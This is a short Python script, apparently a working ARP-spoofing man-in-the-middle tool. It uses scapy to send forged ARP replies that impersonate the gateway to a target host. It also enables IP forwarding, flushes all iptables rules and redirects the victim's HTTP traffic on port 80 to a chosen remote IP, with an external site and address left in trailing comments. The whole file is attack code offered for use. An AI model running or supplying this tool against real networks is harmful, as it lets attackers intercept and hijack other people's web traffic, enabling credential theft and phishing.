#!usr/bin/python
import os
from scapy.all import *
def Attack(interface,tgt,gw,rip):
	enableIPforwarding(interface)
	flushIPtablesandSetupRedirect(interface,rip)
	sendARPreply(tgt,gw)
def sendARPreply(tgt,gw):
	pkt=ARP()
	pkt.psrc=gw
	pkt.pdst=tgt
	try:
		while 1:
			send(pkt)
			time.sleep(3)
	except KeyboardInterrupt:
		pass

def enableIPforwarding(interface):
	f = open("/proc/sys/net/ipv4/ip_forward", "w")
	f.write('1') #ipforwarding enabled! so that we don't drop any packets, we did not request for!
	f.close()
	f = open("/proc/sys/net/ipv4/conf/" + interface+ "/send_redirects", "w")#ICMP redirects turned off
	f.write('0')
	f.close()
def flushIPtablesandSetupRedirect(interface,rip):
	os.system("/sbin/iptables --flush")
	os.system("/sbin/iptables -t nat --flush")
	os.system("/sbin/iptables --zero")
	os.system("/sbin/iptables -A FORWARD --in-interface " +  interface + " -j ACCEPT")
	os.system("/sbin/iptables -t nat --append POSTROUTING --out-interface " + interface+ " -j MASQUERADE")
	os.system("/sbin/iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination " + rip)
#scripterpy.coolpage.biz
#74.125.224.72
